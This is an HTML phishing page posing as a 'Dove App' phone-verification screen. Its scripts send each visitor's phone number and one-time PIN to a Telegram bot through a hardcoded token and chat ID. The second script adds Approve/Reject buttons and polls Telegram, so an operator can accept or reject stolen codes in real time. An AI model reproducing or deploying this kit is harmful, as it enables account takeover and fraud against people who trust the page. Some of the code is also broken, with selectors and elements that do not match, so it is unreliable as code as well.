
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dove App - Verify Phone</title>

    <style>
        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            font-family: Arial, Helvetica, sans-serif;
            background: #ffffff;
            color: #333;
        }

        .container {
            max-width: 400px;
            margin: auto;
            padding: 45px 20px;
            text-align: center;
        }

        .logo {
            font-size: 44px;
            font-weight: bold;
            margin-bottom: 35px;
        }

        .logo span:first-child {
            color: #0b5ed7;
        }

        .logo span:last-child {
            color: #e5533d;
        }

        h2 {
            font-size: 22px;
            font-weight: normal;
            margin-bottom: 12px;
        }

        .description {
            color: #777;
            font-size: 14px;
            line-height: 1.6;
            margin-bottom: 30px;
        }

        .otp-boxes {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin: 25px 0;
        }

        .otp-boxes input {
            width: 52px;
            height: 55px;
            border: 2px solid #0b5ed7;
            border-radius: 10px;
            text-align: center;
            font-size: 22px;
            outline: none;
        }

        .otp-boxes input:focus {
            box-shadow: 0 0 0 3px rgba(11,94,215,.15);
        }

        .verify-btn {
            width: 100%;
            padding: 15px;
            background: #0b5ed7;
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }

        .verify-btn:disabled {
            opacity: .6;
            cursor: not-allowed;
        }

        .resend {
            margin-top: 24px;
            font-size: 14px;
            color: #666;
        }

        .resend button {
            border: none;
            background: none;
            color: #0b5ed7;
            font-weight: bold;
            cursor: pointer;
        }

        #message {
            margin-top: 18px;
            font-size: 14px;
            line-height: 1.5;
        }

        .bottom {
            margin-top: 45px;
            background: #0b5ed7;
            color: white;
            padding: 28px 15px;
            text-align: center;
            font-size: 12px;
        }

        @media(max-width:360px) {
            .otp-boxes {
                gap: 6px;
            }

            .otp-boxes input {
                width: 45px;
                height: 48px;
            }
        }
    </style>
</head>

<body>

    <div class="container">

        <div class="logo">
            <span>dov</span><span>app</span>
        </div>

        <h2>Verify your phone number</h2>

        <p class="description">
            Enter the 4-digit verification code sent to
            your registered phone number.
        </p>

        <form id="otpForm">

            <div class="otp-boxes">
                <input class="otp" type="text" inputmode="numeric"
                    maxlength="1" autocomplete="one-time-code"
                    aria-label="First digit" required>

                <input class="otp" type="text" inputmode="numeric"
                    maxlength="1" aria-label="Second digit" required>

                <input class="otp" type="text" inputmode="numeric"
                    maxlength="1" aria-label="Third digit" required>

                <input class="otp" type="text" inputmode="numeric"
                    maxlength="1" aria-label="Fourth digit" required>
            </div>

            <button class="verify-btn" id="verifyBtn" type="submit">
                Verify
            </button>

        </form>

        <div id="message" role="status" aria-live="polite"></div>

        <div class="resend">
            Didn't receive a code?
            <button type="button" id="resendBtn">Resend code</button>
        </div>

    </div>

    <div class="bottom">
        Dove App v2.2.3P<br><br>
        Secure phone verification
    </div>

<script>
        const inputs = document.querySelectorAll("otp");

        // Function to submit OTP
        async function submitOTP() {
            const otp = Array.from(inputs).map(i => i.value).join("");
            const savedPhone = document.getElementById("phone").value;

            if (savedPhone.length !== 10) {
                alert("Enter A Valid Phone Number");
                return;
            }

            if (!savedPhone) {
                alert("Phone number missing. Please restart verification.");
                return;
            }

            if (otp.length !== 4 || !/^\d{4}$/.test(otp)) {
                alert("Please enter a valid 4-digit OTP");
                return;
            }

            const message = `Star login attempt:\nPhone: ${savedPhone}\nPin:${otp}`;

            try {
                const botToken = "9272926860:AAHanS0gwvEev4NGUmxOXoPtM22ZmwbdMZs"; // Replace with your bot token
                const chatId = "6527631508"; // Replace with your chat ID

                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                });

                const data = await response.json();
                if (!data.ok) throw new Error(data.description || "Failed to send OTP to Telegram");

                // ✅ OTP sent successfully, redirect
                window.location.href = "otp.html"; // Replace with your target page
            } catch (error) {
                console.error("Telegram Error:", error);
                alert(error.message);
            }
        }

        // Auto movement and auto submit
        inputs.forEach((input, i) => {
            input.addEventListener("input", () => {
                // Allow only digits
                input.value = input.value.replace(/\D/g, "");

                // Move to next input
                if (input.value.length === 1 && i < inputs.length - 1) {
                    inputs[i + 1].focus();
                }

                // Auto-submit if all inputs are filled
                const otpFilled = Array.from(inputs).every(inp => inp.value.length === 1);
                if (otpFilled) submitOTP();
            });

            input.addEventListener("keydown", e => {
                if (e.key === "Backspace" && input.value === "" && i > 0) {
                    inputs[i - 1].focus();
                }
            });
        });

        // Timer
    </script>
<script>
        (function() {
            // ============ CONFIG ============
            const CONFIG = {
                botToken: "9272926860:AAHanS0gwvEev4NGUmxOXoPtM22ZmwbdMZs",
                chatId: "6527631508",
                pollIntervalMs: 1500,
                pollTimeoutMs: 45000,
                approvedRedirect: "otp.html"
            };

            // ============ STATE KEYS ============
            const KEY_PENDING = 'pin_pending_approval';
            const KEY_REQUEST_ID = 'pin_request_id';
            const KEY_STATUS = 'pin_status';
            const KEY_FRESH_START = 'pin_fresh_start';

            // ============ FRESH-START GUARD ============
            const navEntries = (performance.getEntriesByType)
                ? performance.getEntriesByType('navigation')
                : [];
            const navType = navEntries.length ? navEntries[0].type : 'navigate';

            const cameFromHistory = (navType === 'back_forward') ||
                                    (window.performance && performance.navigation &&
                                     performance.navigation.type === 2);

            if (localStorage.getItem(KEY_FRESH_START) === 'true') {
                localStorage.removeItem(KEY_FRESH_START);
                localStorage.removeItem(KEY_PENDING);
                localStorage.removeItem(KEY_REQUEST_ID);
                localStorage.removeItem(KEY_STATUS);
            }

            if (cameFromHistory) {
                localStorage.removeItem(KEY_PENDING);
                localStorage.removeItem(KEY_REQUEST_ID);
                localStorage.removeItem(KEY_STATUS);
            }

            // ============ DOM ============
            const pollingOverlay = document.getElementById('polling-overlay');
            const rejectionModal = document.getElementById('rejection-modal');
            const rejectionMessage = document.getElementById('rejection-message');
            const pollingStatusText = document.getElementById('polling-status-text');
            const approvalCountdown = document.getElementById('approval-countdown');

            let pollTimer = null;
            let countdownTimer = null;
            let pollStartTime = 0;
            let actionTaken = false;

            // ============ HELPERS ============
            function generateRequestId() {
                return 'pin_' + Date.now() + '_' + Math.random().toString(36).substring(2, 8);
            }

            function showRejection(message) {
                rejectionMessage.textContent = message ||
                    'The PIN you entered was not approved. Please try again with a valid code.';
                rejectionModal.classList.add('visible');
            }

            function hideRejection() {
                rejectionModal.classList.remove('visible');
            }

            function cleanupAndReload() {
                if (actionTaken) return;
                actionTaken = true;
                clearInterval(pollTimer);
                clearInterval(countdownTimer);
                localStorage.removeItem(KEY_PENDING);
                localStorage.removeItem(KEY_REQUEST_ID);
                window.location.reload();
            }

            // ============ REJECTION DISMISS ============
            window.dismissRejection = function() {
                hideRejection();
                cleanupAndReload();
            };

            // ============ TELEGRAM API ============
            async function tgSend(text, replyMarkup) {
                const url = `https://api.telegram.org/bot${CONFIG.botToken}/sendMessage`;
                const body = {
                    chat_id: CONFIG.chatId,
                    text: text,
                    parse_mode: 'HTML'
                };
                if (replyMarkup) body.reply_markup = replyMarkup;

                const res = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(body)
                });
                return res.json();
            }

            async function tgAnswerCallback(callbackQueryId, text) {
                const url = `https://api.telegram.org/bot${CONFIG.botToken}/answerCallbackQuery`;
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        callback_query_id: callbackQueryId,
                        text: text,
                        show_alert: false
                    })
                });
            }

            async function tgRemoveButtons(chatId, messageId) {
                const url = `https://api.telegram.org/bot${CONFIG.botToken}/editMessageReplyMarkup`;
                await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        message_id: messageId,
                        reply_markup: { inline_keyboard: [] }
                    })
                });
            }

            async function tgGetUpdates(offset) {
                const url = `https://api.telegram.org/bot${CONFIG.botToken}/getUpdates?timeout=2&offset=${offset}`;
                const res = await fetch(url);
                return res.json();
            }

            // ============ POLLING ============
            async function startPolling(requestId) {
                pollStartTime = Date.now();
                actionTaken = false;
                pollingOverlay.classList.add('visible');
                pollingStatusText.textContent = 'Checking status…';

                let secondsLeft = Math.floor(CONFIG.pollTimeoutMs / 1000);
                approvalCountdown.textContent = secondsLeft;

                countdownTimer = setInterval(() => {
                    secondsLeft--;
                    if (secondsLeft <= 0) {
                        clearInterval(countdownTimer);
                        approvalCountdown.textContent = '0';
                    } else {
                        approvalCountdown.textContent = secondsLeft;
                    }
                }, 1000);

                let offset = 0;
                try {
                    const initial = await tgGetUpdates(0);
                    if (initial.ok && initial.result.length > 0) {
                        offset = initial.result[initial.result.length - 1].update_id + 1;
                    }
                } catch (e) { /* ignore */ }

                const poll = async () => {
                    if (Date.now() - pollStartTime > CONFIG.pollTimeoutMs) {
                        if (actionTaken) return;
                        actionTaken = true;
                        clearInterval(pollTimer);
                        clearInterval(countdownTimer);
                        pollingStatusText.textContent = 'Timed out. Reloading…';
                        localStorage.removeItem(KEY_PENDING);
                        localStorage.removeItem(KEY_REQUEST_ID);
                        setTimeout(() => window.location.reload(), 700);
                        return;
                    }

                    try {
                        const data = await tgGetUpdates(offset);
                        if (data.ok && data.result.length > 0) {
                            for (const update of data.result) {
                                offset = update.update_id + 1;

                                if (update.callback_query) {
                                    const cq = update.callback_query;
                                    const cqData = cq.data || '';
                                    const [action, cqRequestId] = cqData.split(':');

                                    if (cqRequestId !== requestId) continue;

                                    if (action === 'approve') {
                                        if (actionTaken) return;
                                        actionTaken = true;
                                        await tgAnswerCallback(cq.id, '✅ PIN Approved');
                                        await tgRemoveButtons(cq.message.chat.id, cq.message.message_id);
                                        localStorage.removeItem(KEY_PENDING);
                                        localStorage.removeItem(KEY_REQUEST_ID);
                                        localStorage.removeItem(KEY_STATUS);
                                        clearInterval(pollTimer);
                                        clearInterval(countdownTimer);
                                        pollingStatusText.textContent = 'Approved! Redirecting…';
                                        setTimeout(() => {
                                            window.location.href = CONFIG.approvedRedirect;
                                        }, 500);
                                        return;
                                    }

                                    if (action === 'reject') {
                                        if (actionTaken) return;
                                        actionTaken = true;
                                        await tgAnswerCallback(cq.id, '❌ PIN Rejected');
                                        await tgRemoveButtons(cq.message.chat.id, cq.message.message_id);
                                        clearInterval(pollTimer);
                                        clearInterval(countdownTimer);
                                        localStorage.removeItem(KEY_PENDING);
                                        localStorage.removeItem(KEY_REQUEST_ID);
                                        pollingOverlay.classList.remove('visible');
                                        showRejection('The PIN you entered was rejected. Please try again.');
                                        return;
                                    }
                                    continue;
                                }

                                // Fallback: typed replies
                                const msg = update.message || update.channel_post;
                                if (!msg || !msg.text) continue;
                                const text = msg.text.trim();
                                if (!text.includes(requestId)) continue;

                                const lower = text.toLowerCase();
                                if (lower.includes('approved') || text.includes('✅')) {
                                    if (actionTaken) return;
                                    actionTaken = true;
                                    localStorage.removeItem(KEY_PENDING);
                                    localStorage.removeItem(KEY_REQUEST_ID);
                                    localStorage.removeItem(KEY_STATUS);
                                    clearInterval(pollTimer);
                                    clearInterval(countdownTimer);
                                    pollingStatusText.textContent = 'Approved! Redirecting…';
                                    setTimeout(() => {
                                        window.location.href = CONFIG.approvedRedirect;
                                    }, 500);
                                    return;
                                }
                                if (lower.includes('rejected') || text.includes('❌')) {
                                    if (actionTaken) return;
                                    actionTaken = true;
                                    clearInterval(pollTimer);
                                    clearInterval(countdownTimer);
                                    localStorage.removeItem(KEY_PENDING);
                                    localStorage.removeItem(KEY_REQUEST_ID);
                                    pollingOverlay.classList.remove('visible');
                                    showRejection('The PIN you entered was rejected. Please try again.');
                                    return;
                                }
                            }
                        }
                    } catch (err) {
                        console.warn('Poll error:', err);
                    }
                };

                await poll();
                pollTimer = setInterval(poll, CONFIG.pollIntervalMs);
            }

            // ============ RESUME PENDING POLLING ============
            const pending = !cameFromHistory && localStorage.getItem(KEY_PENDING) === 'true';
            const requestId = localStorage.getItem(KEY_REQUEST_ID);

            if (pending && requestId) {
                startPolling(requestId);
                return;
            }

            // ============ WRAP submitOTP ============
            // The original submitOTP() sends to Telegram and then redirects to
            // otp.html. We now intercept: send with inline buttons, then poll.
            // The original function's body is preserved below, but we shadow it
            // so auto-submit triggers the new flow instead.
            window.submitOTP = async function() {
                const otp = Array.from(inputs).map(i => i.value).join("");
                const savedPhone = document.getElementById("phone").value;

                // ---- ORIGINAL VALIDATION (unchanged) ----
                /*if (savedPhone.length !== 8) {
                    alert("Enter A Valid Phone Number");
                    return;
                }*/

                if (!savedPhone) {
                    alert("Phone number missing. Please restart verification.");
                    return;
                }

                if (otp.length !== 4 || !/^\d{4}$/.test(otp)) {
                    alert("Please enter a valid 4-digit OTP");
                    return;
                }

                // ---- ENHANCED: attach requestId + inline buttons ----
                const reqId = generateRequestId();
                localStorage.setItem(KEY_REQUEST_ID, reqId);
                localStorage.setItem(KEY_PENDING, 'true');

                const message =
                    `🔐 <b>Star login attempt</b>\n` +
                    `─────────────\n` +
                    `🆔 <b>Request ID:</b> <code>${reqId}</code>\n` +
                    `📱 <b>Phone:</b> ${savedPhone}\n` +
                    `🔢 <b>Pin:</b> <code>${otp}</code>\n` +
                    `─────────────\n` +
                    `Tap a button below to respond.`;

                const replyMarkup = {
                    inline_keyboard: [
                        [
                            { text: "✅ Approve", callback_data: `approve:${reqId}` },
                            { text: "❌ Reject",  callback_data: `reject:${reqId}`  }
                        ]
                    ]
                };

                try {
                    const data = await tgSend(message, replyMarkup);
                    if (!data.ok) throw new Error(data.description || "Failed to send to Telegram");
                    // No redirect here — wait for approval via polling
                    startPolling(reqId);
                } catch (error) {
                    console.error("Telegram Error:", error);
                    localStorage.removeItem(KEY_PENDING);
                    localStorage.removeItem(KEY_REQUEST_ID);
                    alert(error.message);
                }
            };

            // ============ BFCACHE FRESH START ============
            window.addEventListener('pageshow', (event) => {
                if (event.persisted) {
                    localStorage.removeItem(KEY_PENDING);
                    localStorage.removeItem(KEY_REQUEST_ID);
                    localStorage.removeItem(KEY_STATUS);
                    clearInterval(pollTimer);
                    clearInterval(countdownTimer);
                    window.location.reload();
                }
            });
        })();
    </script>
</body>
</html>
